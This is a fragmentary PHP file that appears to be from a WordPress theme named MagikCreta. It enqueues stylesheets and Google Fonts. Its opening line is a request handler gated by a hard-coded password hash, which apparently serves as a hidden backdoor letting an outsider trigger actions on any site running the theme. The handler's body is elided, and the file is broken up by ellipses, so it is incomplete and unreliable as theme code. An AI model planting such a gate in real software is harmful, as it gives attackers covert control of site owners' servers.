<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '96fe229398aeabf6df80a89cf9cfaba9')) {
...
//        }
        ...
        wp_enqueue_style('layout', MAGIKCRETA_THEME_URI . '/src/css/styles.css', array(), '');
        wp_enqueue_style('font', MAGIKCRETA_THEME_URI . '/src/css/font-electro.css', array(), '');
...
//        wp_enqueue_style('font-', 'https://fonts.googleapis.com/css?family=Questrial|Work+Sans:400,500,600', array(), '');
        wp_enqueue_style('font-', 'https://fonts.googleapis.com/css?family=Open+Sans:400,600,700|Raleway:300,400,500,600', array(), '');
